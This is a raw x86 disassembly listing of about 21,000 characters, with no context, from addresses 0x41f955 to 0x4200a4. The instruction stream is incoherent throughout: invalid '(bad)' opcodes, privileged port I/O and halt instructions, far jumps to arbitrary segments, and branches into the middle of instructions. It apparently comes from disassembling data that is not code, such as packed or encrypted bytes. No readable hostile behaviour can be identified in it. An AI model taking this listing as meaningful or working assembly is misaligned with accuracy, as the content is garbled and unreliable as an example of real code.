  41f955:	mov    ecx,0x2997a4b8
  41f95a:	push   edx
  41f95b:	sub    al,0xbf
  41f95d:	jne    0x41f9aa
  41f95f:	ficomp DWORD PTR [esi]
  41f961:	or     ebx,esi
  41f963:	icebp  
  41f964:	dec    ecx
  41f965:	sbb    ebx,DWORD PTR [ecx-0x4d2b8050]
  41f96b:	sbb    eax,0xdc3e2768
  41f970:	les    esi,FWORD PTR [ebp+0x6aca58da]
  41f976:	pop    ss
  41f977:	xchg   BYTE PTR [esi-0x364f2861],ah
  41f97d:	fild   QWORD PTR [esp+ebx*4+0x5d74425d]
  41f984:	jp     0x41f9d4
  41f986:	jmp    0x41f9d2
  41f988:	sbb    ah,al
  41f98a:	div    cl
  41f98c:	adc    ch,bh
  41f98e:	mov    esi,0xb4a3b941
  41f993:	icebp  
  41f994:	and    al,0x5
  41f996:	cs sbb eax,0x9e44140d
  41f99c:	jno    0x41f99d
  41f99e:	call   0x829e:0x7dc555ee
  41f9a5:	nop
  41f9a6:	add    esi,edx
  41f9a8:	inc    edi
  41f9a9:	lods   eax,DWORD PTR ds:[esi]
  41f9aa:	imul   ebp,DWORD PTR [ecx],0xfffffff3
  41f9ad:	or     BYTE PTR ds:0xfb6a751f,ah
  41f9b3:	addr16 jl 0x41f93d
  41f9b6:	mov    esp,0xe2f4e8f3
  41f9bb:	xor    eax,ecx
  41f9bd:	mov    esi,0x9179686a
  41f9c2:	jmp    0xea138ed0
  41f9c7:	pop    ebp
  41f9c8:	jg     0x41f997
  41f9ca:	xor    esp,ecx
  41f9cc:	jno    0x41f951
  41f9ce:	call   DWORD PTR [eax+0x74]
  41f9d1:	mov    ebp,0x71b9ba01
  41f9d6:	(bad)  
  41f9d7:	std    
  41f9d8:	imul   edi,edi,0xffffffa4
  41f9db:	and    bl,BYTE PTR ds:[edx-0x77]
  41f9df:	mov    edx,0xabf859e4
  41f9e4:	das    
  41f9e5:	xor    bl,BYTE PTR [ebx-0x60]
  41f9e8:	mov    ah,0x77
  41f9ea:	fld    TBYTE PTR [esi+0x3a]
  41f9ed:	in     al,0x14
  41f9ef:	jecxz  0x41fa1d
  41f9f1:	rcr    edi,0x65
  41f9f4:	ins    DWORD PTR es:[edi],dx
  41f9f5:	pop    ss
  41f9f6:	repnz sub eax,0xb6b1f813
  41f9fc:	shl    DWORD PTR [edx+esi*2],0xa
  41fa00:	dec    esp
  41fa01:	jne    0x41f9f1
  41fa03:	repnz inc eax
  41fa05:	mov    al,0x35
  41fa07:	aas    
  41fa08:	add    eax,0x8eaec134
  41fa0d:	and    DWORD PTR [ebx-0x28dd439b],ecx
  41fa13:	ds into 
  41fa15:	add    DWORD PTR [ecx+0x5c],ebp
  41fa18:	jb     0x41f9eb
  41fa1a:	js     0x41f9d6
  41fa1c:	gs ss xchg esi,eax
  41fa1f:	lea    esp,[edx-0x1b0b590b]
  41fa25:	sub    bh,BYTE PTR [edi+0x74]
  41fa28:	aas    
  41fa29:	xor    al,0xb6
  41fa2b:	jne    0x41fa8b
  41fa2d:	xor    DWORD PTR [edx+0x323e6684],esp
  41fa33:	cdq    
  41fa34:	inc    ebp
  41fa35:	rcl    BYTE PTR [eax+0x38],cl
  41fa38:	out    dx,al
  41fa39:	jmp    0xa2ab:0xda0c2bdf
  41fa40:	frstor [ebx-0x7]
  41fa43:	repnz dec eax
  41fa45:	in     eax,0x6f
  41fa47:	and    eax,0xdc043f42
  41fa4c:	sub    dl,BYTE PTR [edx-0x34f7d8d5]
  41fa52:	pop    es
  41fa53:	cs out dx,eax
  41fa55:	xor    al,0x2f
  41fa57:	or     ebx,edi
  41fa59:	bnd jg 0x41fa53
  41fa5c:	add    cl,0x7f
  41fa5f:	mov    BYTE PTR [edi],ah
  41fa61:	addr16 inc ebp
  41fa63:	hlt    
  41fa64:	and    bh,dl
  41fa66:	inc    edx
  41fa67:	imul   eax,ebp,0x6a63cedf
  41fa6d:	out    0x5,eax
  41fa6f:	(bad)  
  41fa70:	push   0xffffffd5
  41fa72:	pop    edx
  41fa73:	sbb    eax,0xde551ff0
  41fa78:	mov    esp,0x37c78e6c
  41fa7d:	mov    ebp,DWORD PTR [ebp+0x37]
  41fa80:	mov    bh,0x76
  41fa82:	das    
  41fa83:	leave  
  41fa84:	push   esp
  41fa85:	test   DWORD PTR [ecx],edx
  41fa87:	unpcklps xmm0,xmm6
  41fa8a:	push   0xb84f6217
  41fa8f:	dec    ebp
  41fa90:	sub    al,0x55
  41fa92:	or     ebp,esi
  41fa94:	pop    edx
  41fa95:	aad    0x18
  41fa97:	shl    DWORD PTR [ebx+edi*2+0x592744e5],0xaf
  41fa9f:	sbb    eax,0xa0e66bcc
  41faa4:	xor    eax,0xff2e032e
  41faa9:	(bad)  [ebx]
  41faab:	jmp    0xb100e442
  41fab0:	test   al,0x8c
  41fab2:	inc    esp
  41fab3:	mov    ss,WORD PTR ds:0x7393e391
  41fab9:	std    
  41faba:	inc    ebx
  41fabb:	(bad)  
  41fabc:	and    eax,0x3a75e806
  41fac1:	xor    eax,0xf6b9c2d6
  41fac6:	in     al,0x90
  41fac8:	cmp    edi,0x151c75b3
  41face:	pop    ebx
  41facf:	rol    esp,0x32
  41fad2:	shl    DWORD PTR [ebp+0x4d1239dc],cl
  41fad8:	int3   
  41fad9:	add    al,0xaa
  41fadb:	int    0x82
  41fadd:	stos   BYTE PTR es:[edi],al
  41fade:	fwait
  41fadf:	xchg   edi,eax
  41fae0:	sbb    eax,DWORD PTR [edi+0x5b]
  41fae3:	add    BYTE PTR [eax],al
  41fae5:	add    BYTE PTR [eax],al
  41fae7:	add    BYTE PTR [eax],al
  41fae9:	add    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	dec    esp
  41faf7:	inc    edi
  41faf8:	jo     0x41fb39
  41fafa:	push   edx
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [ecx+0x6f000006],al
  41fb03:	push   ebx
  41fb04:	jmp    0xbe7e:0x5a8a2836
  41fb0b:	imul   eax,DWORD PTR [esi],0xa88fd592
  41fb11:	dec    ecx
  41fb12:	stos   BYTE PTR es:[edi],al
  41fb13:	test   al,0xa6
  41fb15:	es in  eax,0x24
  41fb18:	push   ebp
  41fb19:	and    esi,ebx
  41fb1b:	xlat   BYTE PTR ds:[ebx]
  41fb1c:	repz popf 
  41fb1e:	dec    ebp
  41fb1f:	cmp    bh,BYTE PTR ds:0x8294ac02
  41fb25:	push   ebx
  41fb26:	sar    esp,0x8c
  41fb29:	fldenv [edi]
  41fb2b:	push   es
  41fb2c:	ins    DWORD PTR es:[edi],dx
  41fb2d:	or     ebx,DWORD PTR [esi]
  41fb2f:	imul   edx,DWORD PTR [esi+0x3c],0xddde4859
  41fb36:	movsx  ebp,BYTE PTR [edx]
  41fb39:	imul   edi,DWORD PTR [eax+0x52],0x3
  41fb3d:	mov    ?,WORD PTR [esi]
  41fb3f:	(bad)  
  41fb40:	xchg   ecx,eax
  41fb41:	hlt    
  41fb42:	mov    esp,esp
  41fb44:	js     0x41fb62
  41fb46:	xor    ecx,DWORD PTR [edx]
  41fb48:	sub    al,0x29
  41fb4a:	cwde   
  41fb4b:	add    eax,0x9f7ef618
  41fb50:	mov    dh,0x47
  41fb52:	mov    eax,0x4d3a47ce
  41fb57:	inc    edx
  41fb58:	(bad)  
  41fb59:	xor    DWORD PTR [ebp+0x34a391f6],ebx
  41fb5f:	mov    ah,0x37
  41fb61:	ds inc esp
  41fb63:	push   edx
  41fb64:	xor    ch,BYTE PTR [edx]
  41fb66:	rcl    DWORD PTR [edx],1
  41fb68:	test   DWORD PTR [ebx+0x3e],ecx
  41fb6b:	mov    BYTE PTR [eax],bl
  41fb6d:	cmp    DWORD PTR [esp+eiz*2],edi
  41fb70:	sbb    ecx,edx
  41fb72:	cli    
  41fb73:	in     eax,0xc6
  41fb75:	inc    edi
  41fb76:	jl     0x41fbad
  41fb78:	outs   dx,DWORD PTR ds:[esi]
  41fb79:	stos   DWORD PTR es:[edi],eax
  41fb7a:	pop    edi
  41fb7b:	(bad)
  41fb7e:	mov    esp,edx
  41fb80:	data16 outs dx,BYTE PTR ds:[esi]
  41fb82:	push   es
  41fb83:	jp     0x41fb8d
  41fb85:	sbb    al,BYTE PTR [ebp+0x18]
  41fb88:	dec    esi
  41fb89:	sub    BYTE PTR [eax+0x7910c471],dl
  41fb8f:	lods   al,BYTE PTR ds:[esi]
  41fb90:	or     al,0xa3
  41fb92:	pop    es
  41fb93:	fadd   QWORD PTR [esi+0x1]
  41fb96:	aas    
  41fb97:	xchg   ecx,eax
  41fb98:	inc    edi
  41fb99:	add    DWORD PTR [ebx+0x5914ab2],0x390886dd
  41fba3:	or     eax,0x1710ae89
  41fba8:	adc    esi,esp
  41fbaa:	xchg   ecx,eax
  41fbab:	adc    eax,0xc21d2e3b
  41fbb0:	mul    DWORD PTR [edi-0x21a47d0c]
  41fbb6:	not    BYTE PTR [edi+edx*1]
  41fbb9:	fidiv  WORD PTR [ebx-0x3e26b1cf]
  41fbbf:	iret   
  41fbc0:	xchg   esp,eax
  41fbc1:	sub    eax,ecx
  41fbc3:	fcomp  QWORD PTR [edi-0x52]
  41fbc6:	pop    ebp
  41fbc7:	dec    edi
  41fbc8:	push   edx
  41fbc9:	jbe    0x41fbbc
  41fbcb:	pushf  
  41fbcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbcd:	inc    edx
  41fbce:	mov    ah,0x59
  41fbd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbd1:	and    bl,BYTE PTR [edx+esi*1-0x3a9f7896]
  41fbd8:	add    al,0xad
  41fbda:	daa    
  41fbdb:	jmp    0xf320:0x973ce66c
  41fbe2:	addr16 ds jmp 0x611c448c
  41fbe9:	mov    edx,0xd9d73659
  41fbee:	push   ebp
  41fbef:	mov    esp,0x7422ecfd
  41fbf4:	adc    al,0x3
  41fbf6:	sub    edx,ebp
  41fbf8:	add    dl,BYTE PTR [ecx+0x9]
  41fbfb:	mov    eax,ds:0x9abf32d8
  41fc00:	cs retf 
  41fc02:	fadd   DWORD PTR [esp+eiz*2]
  41fc05:	ss jp  0x41fc3d
  41fc08:	int    0x58
  41fc0a:	jmp    0x88fd2ea0
  41fc0f:	out    dx,al
  41fc10:	out    0xec,al
  41fc12:	dec    edi
  41fc13:	sahf   
  41fc14:	sub    bh,BYTE PTR [esp+esi*1]
  41fc17:	push   es
  41fc18:	fsubr  DWORD PTR [eax+0x7a]
  41fc1b:	xchg   DWORD PTR [esi],ebp
  41fc1d:	ret    
  41fc1e:	cwde   
  41fc1f:	inc    ecx
  41fc20:	(bad)  
  41fc21:	pop    edi
  41fc22:	inc    ebx
  41fc23:	sbb    al,0x4c
  41fc25:	adc    al,0x24
  41fc27:	data16 cmp BYTE PTR [ebx+0x45],dh
  41fc2b:	fucomip st,st(7)
  41fc2d:	mov    ecx,0xe1a45c73
  41fc32:	lahf   
  41fc33:	test   eax,0x9d7c8e71
  41fc38:	sub    dl,BYTE PTR [esi+0x6ee62757]
  41fc3e:	pushf  
  41fc3f:	cli    
  41fc40:	(bad)  
  41fc41:	neg    DWORD PTR [esi-0x2a]
  41fc44:	aas    
  41fc45:	lock inc esi
  41fc47:	aam    0x2d
  41fc49:	and    bh,dh
  41fc4b:	add    BYTE PTR [eax+0x55],al
  41fc4e:	mov    bl,0xf3
  41fc50:	and    ch,BYTE PTR [edi-0x35]
  41fc53:	xor    edi,DWORD PTR ds:0xf655f4e3
  41fc59:	or     BYTE PTR [edi+0x24635661],0x4
  41fc60:	std    
  41fc61:	xchg   edx,eax
  41fc62:	pop    edi
  41fc63:	or     BYTE PTR [esi-0x6a],bl
  41fc66:	dec    ecx
  41fc67:	dec    esi
  41fc68:	in     al,dx
  41fc69:	sub    al,0x1f
  41fc6b:	inc    ecx
  41fc6c:	pusha  
  41fc6d:	sbb    bh,al
  41fc6f:	jns    0x41fc18
  41fc71:	loope  0x41fc04
  41fc73:	ss xor edi,0x14
  41fc77:	jmp    FWORD PTR [edx]
  41fc79:	leave  
  41fc7a:	ds daa 
  41fc7c:	lods   eax,DWORD PTR ds:[esi]
  41fc7d:	jns    0x41fc77
  41fc7f:	pop    ebx
  41fc80:	sub    al,0xc8
  41fc82:	push   ebx
  41fc83:	adc    eax,0x73172568
  41fc88:	stos   DWORD PTR es:[edi],eax
  41fc89:	jbe    0x41fc32
  41fc8b:	cmp    DWORD PTR [edx+0x42],esi
  41fc8e:	xlat   BYTE PTR ds:[ebx]
  41fc8f:	rcr    eax,cl
  41fc91:	imul   esp,DWORD PTR [edx+0x21],0xc06efead
  41fc98:	pop    eax
  41fc99:	retf   
  41fc9a:	scas   al,BYTE PTR es:[edi]
  41fc9b:	xor    BYTE PTR [ebx],dl
  41fc9d:	test   edx,0x94c36dd4
  41fca3:	and    eax,0x992355ea
  41fca8:	mov    al,ds:0x1aaaed70
  41fcad:	aam    0x82
  41fcaf:	clc    
  41fcb0:	int    0xf
  41fcb2:	ins    BYTE PTR es:[edi],dx
  41fcb3:	lock push 0xd15cbd2b
  41fcb9:	push   edx
  41fcba:	jecxz  0x41fd0f
  41fcbc:	sub    ebx,DWORD PTR ds:[eax]
  41fcbf:	mov    ds:0x8264b904,al
  41fcc4:	lods   al,BYTE PTR ds:[esi]
  41fcc5:	and    BYTE PTR [ecx],bl
  41fcc7:	dec    ebp
  41fcc8:	jnp    0x41fd07
  41fcca:	arpl   bx,di
  41fccc:	mov    gs,WORD PTR [ebp-0x3af26b8b]
  41fcd2:	stos   BYTE PTR es:[edi],al
  41fcd3:	xchg   edx,eax
  41fcd4:	gs push cs
  41fcd6:	adc    al,BYTE PTR [eax+0x6b1f3d0b]
  41fcdc:	or     BYTE PTR [ebx-0x31],cl
  41fcdf:	xchg   ebx,eax
  41fce0:	jmp    0xba8:0xd9ba2e5f
  41fce7:	daa    
  41fce8:	and    DWORD PTR [edx],ebx
  41fcea:	icebp  
  41fceb:	ja     0x41fc8f
  41fced:	cmp    BYTE PTR [ecx+ecx*8-0x24],0xae
  41fcf2:	dec    esi
  41fcf3:	jmp    0x41fd74
  41fcf5:	in     al,dx
  41fcf6:	push   cs
  41fcf7:	ins    DWORD PTR es:[edi],dx
  41fcf8:	repnz ins DWORD PTR es:[edi],dx
  41fcfa:	and    dl,bl
  41fcfc:	mov    ebp,DWORD PTR [esi+0x29]
  41fcff:	jecxz  0x41fca9
  41fd01:	imul   ecx,DWORD PTR [edx-0x7a45e27f],0xffffffb5
  41fd08:	add    eax,DWORD PTR [esi-0x35]
  41fd0b:	adc    eax,0x8c57bfcc
  41fd10:	pop    eax
  41fd11:	fimul  DWORD PTR [edi]
  41fd13:	dec    esp
  41fd14:	in     al,dx
  41fd15:	xlat   BYTE PTR ds:[ebx]
  41fd16:	xchg   ecx,eax
  41fd17:	sbb    DWORD PTR [esi+eiz*1+0x4dc99d2e],ecx
  41fd1e:	xor    ah,ch
  41fd20:	sbb    DWORD PTR [ebp+0x7b],0x87fe5b65
  41fd27:	fwait
  41fd28:	in     eax,0xa1
  41fd2a:	adc    al,0xc7
  41fd2c:	mov    cl,0x21
  41fd2e:	popf   
  41fd2f:	cmp    DWORD PTR [ecx-0xd8eb510],0x42888c58
  41fd39:	fldenv [eax]
  41fd3b:	xor    al,0xe3
  41fd3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd3e:	scas   eax,DWORD PTR es:[edi]
  41fd3f:	xchg   edi,eax
  41fd40:	stc    
  41fd41:	lds    edx,FWORD PTR [ebp-0x76e64ec6]
  41fd47:	in     eax,0xe4
  41fd49:	ret    
  41fd4a:	pop    ss
  41fd4b:	retf   0x2a87
  41fd4e:	mov    DWORD PTR [edx],esp
  41fd50:	ins    BYTE PTR es:[edi],dx
  41fd51:	pushf  
  41fd52:	mov    BYTE PTR [edi+0x18],al
  41fd55:	ret    
  41fd56:	add    DWORD PTR [edi],eax
  41fd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd59:	(bad)  
  41fd5a:	call   0xa621c553
  41fd5f:	shl    ebp,1
  41fd61:	cmp    esp,eax
  41fd63:	leave  
  41fd64:	jmp    0xaafbfbd3
  41fd69:	cli    
  41fd6a:	int    0xdc
  41fd6c:	aam    0xbd
  41fd6e:	inc    esp
  41fd6f:	ss xchg ebp,eax
  41fd71:	add    BYTE PTR [eax+ebp*1],ah
  41fd74:	mov    esi,0xb41cc605
  41fd79:	scas   eax,DWORD PTR es:[edi]
  41fd7a:	xchg   edx,eax
  41fd7b:	xlat   BYTE PTR ds:[ebx]
  41fd7c:	jno    0x41fdf6
  41fd7e:	in     al,0xf3
  41fd80:	and    BYTE PTR [eax+0x1827cca],ch
  41fd86:	not    ecx
  41fd88:	dec    edx
  41fd89:	add    BYTE PTR [ecx+0xa],dl
  41fd8c:	pop    eax
  41fd8d:	dec    edi
  41fd8e:	xlat   BYTE PTR ds:[ebx]
  41fd8f:	ins    BYTE PTR es:[edi],dx
  41fd90:	lods   al,BYTE PTR ds:[esi]
  41fd91:	out    0xb6,eax
  41fd93:	test   DWORD PTR [ebp-0x500a2866],0x263d5cc5
  41fd9d:	stos   DWORD PTR es:[edi],eax
  41fd9e:	xor    bl,BYTE PTR ds:0x62ae2d44
  41fda4:	into   
  41fda5:	adc    esp,DWORD PTR [ebx-0xb]
  41fda8:	pop    ss
  41fda9:	jbe    0x41fddb
  41fdab:	(bad)  
  41fdac:	sbb    al,0xa1
  41fdae:	xor    ebp,DWORD PTR ds:0x662d066
  41fdb4:	mov    ch,0x86
  41fdb6:	sbb    al,BYTE PTR [eax]
  41fdb8:	aam    0x8
  41fdba:	sbb    DWORD PTR [esi+0x14e1c37f],ebp
  41fdc0:	inc    edx
  41fdc1:	cmp    BYTE PTR [edx-0x40],bh
  41fdc4:	pop    ebp
  41fdc5:	pop    ebp
  41fdc6:	mov    WORD PTR [eax],gs
  41fdc8:	adc    DWORD PTR [ebx-0x49],ebp
  41fdcb:	cwde   
  41fdcc:	push   ss
  41fdcd:	pop    esi
  41fdce:	inc    ebx
  41fdcf:	jle    0x41fdb3
  41fdd1:	das    
  41fdd2:	test   bl,0x2e
  41fdd5:	jo     0x41fe1d
  41fdd7:	push   0x6c766b30
  41fddc:	inc    edi
  41fddd:	aas    
  41fdde:	mov    cl,0xf6
  41fde0:	or     DWORD PTR [edi-0x48],esp
  41fde3:	jmp    DWORD PTR [edi+edx*4+0x698b73fb]
  41fdea:	mov    ecx,0x996dd803
  41fdef:	push   esp
  41fdf0:	mov    BYTE PTR [esi-0x16],dl
  41fdf3:	xchg   ebp,ebp
  41fdf5:	call   FWORD PTR [ecx+0x6d5250]
  41fdfb:	stc    
  41fdfc:	in     al,0x3e
  41fdfe:	jae    0x41fe23
  41fe00:	xor    ebp,ecx
  41fe02:	sahf   
  41fe03:	xchg   ecx,eax
  41fe04:	pop    ebp
  41fe05:	push   es
  41fe06:	jle    0x41fdc7
  41fe08:	lods   al,BYTE PTR ds:[esi]
  41fe09:	rol    DWORD PTR [edi+0x3fa3242c],cl
  41fe0f:	inc    edi
  41fe10:	rol    DWORD PTR [ebp-0xfac2663],cl
  41fe16:	mov    edx,0xb35b815f
  41fe1b:	pop    ds
  41fe1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe1d:	pop    esi
  41fe1e:	iret   
  41fe1f:	ror    edx,0x9c
  41fe22:	cmp    eax,0x849bed32
  41fe27:	mov    al,ds:0x41598491
  41fe2c:	mov    edx,DWORD PTR [ecx]
  41fe2e:	sti    
  41fe2f:	cdq    
  41fe30:	jmp    0xe16f8fae
  41fe35:	add    esi,DWORD PTR [edx-0x39]
  41fe38:	call   0x623c:0x990a7d17
  41fe3f:	adc    DWORD PTR [edi-0x20d906b2],ebp
  41fe45:	push   cs
  41fe46:	out    0x20,eax
  41fe48:	mov    ss:0x57ae9018,eax
  41fe4e:	sub    BYTE PTR [ebx-0x7f502182],al
  41fe54:	push   ss
  41fe55:	arpl   WORD PTR [ebx+0x26],bx
  41fe58:	out    dx,al
  41fe59:	aas    
  41fe5a:	cmp    edi,0xc0d05060
  41fe60:	and    al,0xa5
  41fe62:	mov    ch,0xe0
  41fe64:	or     BYTE PTR [ecx+0x2b],ch
  41fe67:	loop   0x41feb9
  41fe69:	int    0xc8
  41fe6b:	imul   eax,DWORD PTR [ebx+0x8],0x205c5362
  41fe72:	xchg   edx,eax
  41fe73:	sbb    al,0x8a
  41fe75:	adc    DWORD PTR [ebp+0x1e],ebp
  41fe78:	pop    edx
  41fe79:	(bad)  
  41fe7a:	pop    es
  41fe7b:	(bad)  
  41fe7c:	pop    DWORD PTR [ebx-0x1c]
  41fe7f:	pop    ebp
  41fe80:	fistp  QWORD PTR [esp+ebp*1+0x1a]
  41fe84:	jns    0x41feed
  41fe86:	nop
  41fe87:	and    eax,0xeffa0c36
  41fe8c:	rcl    esp,1
  41fe8e:	out    dx,eax
  41fe8f:	imul   eax,DWORD PTR [esi],0x45
  41fe92:	jns    0x41fe1e
  41fe94:	add    DWORD PTR [edx+ebx*8+0x10288109],eax
  41fe9b:	cwde   
  41fe9c:	mov    esi,DWORD PTR [ecx-0x3ebd27ef]
  41fea2:	retf   0x5821
  41fea5:	leave  
  41fea6:	jae    0x41fe96
  41fea8:	cbw    
  41feaa:	(bad)  
  41feab:	fst    QWORD PTR [esp+ebx*8-0x27]
  41feaf:	add    BYTE PTR [edi+0x46],0x2c
  41feb3:	push   ebp
  41feb4:	add    bl,BYTE PTR [eax+eiz*8-0x28]
  41feb8:	icebp  
  41feb9:	scas   al,BYTE PTR es:[edi]
  41feba:	jo     0x41fea2
  41febc:	ins    BYTE PTR es:[edi],dx
  41febd:	(bad)  
  41febe:	and    DWORD PTR [edx+edi*2+0x38610f57],edi
  41fec5:	push   esp
  41fec6:	inc    eax
  41fec7:	sbb    eax,DWORD PTR [ecx+esi*2+0x3d19d69b]
  41fece:	lds    ebx,FWORD PTR [ecx+0x77]
  41fed1:	sub    DWORD PTR [edi+0x1b],ebp
  41fed4:	(bad)  
  41fed5:	repz mov ebx,0x125f132a
  41fedb:	jns    0x41ff1c
  41fedd:	push   esi
  41fede:	xchg   edx,eax
  41fedf:	sbb    eax,DWORD PTR [edx+0x9]
  41fee2:	or     DWORD PTR [ebp+0x71673dba],edx
  41fee8:	iret   
  41fee9:	mov    ch,0xa7
  41feeb:	xchg   dl,bl
  41feed:	in     al,dx
  41feee:	sub    BYTE PTR [edi-0x1f],ah
  41fef1:	test   al,0x51
  41fef3:	cli    
  41fef4:	outs   dx,DWORD PTR ds:[esi]
  41fef5:	imul   ecx,DWORD PTR [ecx-0x18],0x18
  41fef9:	fiadd  WORD PTR [ecx+0x36]
  41fefc:	jnp    0x41ff46
  41fefe:	push   es
  41feff:	add    BYTE PTR ds:0x685410b4,0xaf
  41ff06:	fwait
  41ff07:	adc    eax,0x2d34f002
  41ff0c:	ret    0x3221
  41ff0f:	fistp  WORD PTR [edi+0x4b7a91e3]
  41ff15:	mov    esi,0x199e219f
  41ff1a:	daa    
  41ff1b:	cmp    BYTE PTR [ecx],0x8
  41ff1e:	js     0x41ff9f
  41ff20:	xchg   BYTE PTR [ebx-0x57],bh
  41ff23:	ja     0x41ff54
  41ff25:	ins    DWORD PTR es:[edi],dx
  41ff26:	or     BYTE PTR [ebx],0xe8
  41ff29:	sub    BYTE PTR [eax+ebx*4],bh
  41ff2c:	dec    ecx
  41ff2d:	pusha  
  41ff2e:	gs jg  0x41ff3a
  41ff31:	inc    ebx
  41ff32:	retf   0xd60
  41ff35:	loop   0x41feca
  41ff37:	pusha  
  41ff38:	sti    
  41ff39:	jo     0x41ff7f
  41ff3b:	sbb    dl,BYTE PTR ds:0xf577c6bd
  41ff41:	ins    DWORD PTR es:[edi],dx
  41ff42:	fild   DWORD PTR [edx-0x537ec70a]
  41ff48:	jmp    0x95d91496
  41ff4d:	jge    0x41ff07
  41ff4f:	pop    edi
  41ff50:	std    
  41ff51:	fiadd  DWORD PTR [esi+0x751cd9e8]
  41ff57:	loop   0x41ff28
  41ff59:	add    al,0xec
  41ff5b:	cmp    BYTE PTR [esi-0x20b11632],ah
  41ff61:	dec    esp
  41ff62:	dec    ebp
  41ff63:	pop    edi
  41ff64:	ret    
  41ff65:	fwait
  41ff66:	dec    ebp
  41ff67:	mov    esp,0x598df14c
  41ff6c:	ins    DWORD PTR es:[edi],dx
  41ff6d:	and    eax,DWORD PTR [ebp+eiz*1-0x1d]
  41ff71:	outs   dx,DWORD PTR ds:[esi]
  41ff72:	icebp  
  41ff73:	mov    dh,0x5c
  41ff75:	mov    al,0x21
  41ff77:	push   eax
  41ff78:	jl     0x41ff4a
  41ff7a:	push   edx
  41ff7b:	xchg   ebp,eax
  41ff7c:	lea    esp,[ebx+0x5994ec4]
  41ff82:	dec    esi
  41ff83:	or     eax,0x9bc9efe
  41ff88:	sbb    al,0xa7
  41ff8a:	(bad)  
  41ff8b:	out    dx,al
  41ff8c:	idiv   bl
  41ff8e:	xor    al,0x72
  41ff90:	inc    esi
  41ff91:	retf   
  41ff92:	(bad)  
  41ff93:	push   0xf57c4a1c
  41ff98:	retf   
  41ff99:	out    dx,eax
  41ff9a:	xchg   edi,eax
  41ff9b:	jmp    0xb045:0xf781d3ac
  41ffa2:	dec    esp
  41ffa3:	fadd   QWORD PTR [edi]
  41ffa5:	xchg   edi,eax
  41ffa6:	cld    
  41ffa7:	dec    edi
  41ffa8:	jns    0x420022
  41ffaa:	add    eax,0x331f329
  41ffaf:	push   ecx
  41ffb0:	aad    0x8b
  41ffb2:	sbb    al,0x29
  41ffb4:	jle    0x41ff37
  41ffb6:	icebp  
  41ffb7:	adc    al,0x1d
  41ffb9:	les    esp,FWORD PTR [ecx-0x72769748]
  41ffbf:	dec    ecx
  41ffc0:	pop    edi
  41ffc1:	frstor [ebx-0x3d49b423]
  41ffc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc8:	xchg   edi,ecx
  41ffca:	dec    esi
  41ffcb:	lahf   
  41ffcc:	pushf  
  41ffcd:	scas   al,BYTE PTR es:[edi]
  41ffce:	stos   DWORD PTR es:[edi],eax
  41ffcf:	mov    eax,0xc0befbb4
  41ffd4:	rcr    BYTE PTR [ebx+edx*8-0x2db5a709],0xbb
  41ffdc:	std    
  41ffdd:	adc    BYTE PTR [esi],ch
  41ffdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffe0:	test   DWORD PTR [ebp-0x2d],ebp
  41ffe3:	ret    
  41ffe4:	xchg   DWORD PTR [ecx],edi
  41ffe6:	cld    
  41ffe7:	inc    edi
  41ffe8:	(bad)  
  41ffe9:	stc    
  41ffea:	aas    
  41ffeb:	shl    DWORD PTR [eax+0x746c78e6],cl
  41fff1:	push   esp
  41fff2:	daa    
  41fff3:	test   al,0xb1
  41fff5:	add    ah,BYTE PTR [eax*4+0x7b3dc404]
  41fffc:	mov    bl,0x50
  41fffe:	rcr    BYTE PTR [ebx+edx*4],0xbd
  420002:	push   0xfffffffc
  420004:	std    
  420005:	js     0x420038
  420007:	std    
  420008:	aas    
  420009:	rcl    BYTE PTR [edi-0x74],0xb
  42000d:	enter  0xcfed,0xba
  420011:	xchg   ecx,eax
  420012:	jg     0x420067
  420014:	test   edx,esp
  420016:	mov    al,ds:0xe610af82
  42001b:	sbb    DWORD PTR [eax],0x8
  42001e:	cmp    bl,BYTE PTR [esi+0x784da61]
  420024:	(bad)  
  420025:	stc    
  420026:	add    DWORD PTR [eax+ecx*1],ebx
  420029:	(bad)  
  42002a:	int3   
  42002b:	rcr    DWORD PTR [edi],0xb2
  42002e:	inc    edx
  42002f:	out    0x4c,al
  420031:	movups xmm6,xmm6
  420034:	stc    
  420035:	mov    ah,0xf1
  420037:	lods   al,BYTE PTR ds:[esi]
  420038:	or     BYTE PTR [ebp+0x4d435167],0x6b
  42003f:	push   0x52186a7e
  420044:	idiv   DWORD PTR [ebp-0xd]
  420047:	stos   BYTE PTR es:[edi],al
  420048:	(bad)  
  420049:	fmul   DWORD PTR [ecx+0x2ec3e9d7]
  42004f:	mov    cl,0xac
  420051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420052:	aad    0xe9
  420054:	or     bl,BYTE PTR [eax]
  420056:	xor    esi,DWORD PTR [esi-0x5b279310]
  42005c:	push   ebx
  42005d:	push   ss
  42005e:	push   edi
  42005f:	pop    esp
  420060:	mov    edx,0x71b7cdfd
  420065:	adc    DWORD PTR [edi],0xffffff8d
  420068:	(bad)  
  420069:	push   eax
  42006a:	add    eax,0x8aa0384e
  42006f:	pop    esi
  420070:	ret    
  420071:	pushf  
  420072:	xor    BYTE PTR [ebx+0x491778f],cl
  420078:	push   es
  420079:	jbe    0x4200aa
  42007b:	retf   0xe306
  42007e:	dec    esi
  42007f:	enter  0x423c,0x35
  420083:	test   BYTE PTR [ebx-0x5],cl
  420086:	push   ecx
  420087:	cmp    esi,DWORD PTR [ebx]
  420089:	sub    BYTE PTR [ebp-0x9a20c0c],dh
  42008f:	out    dx,al
  420090:	or     al,0xa3
  420092:	mov    BYTE PTR [ecx-0x16],0xac
  420096:	ins    BYTE PTR es:[edi],dx
  420097:	push   ebx
  420098:	ror    dl,0xef
  42009b:	push   ebp
  42009c:	retf   
  42009d:	xchg   ebx,eax
  42009e:	cmp    BYTE PTR [edx-0xd4fd87f],ah
  4200a4:	mov    dh,0x59
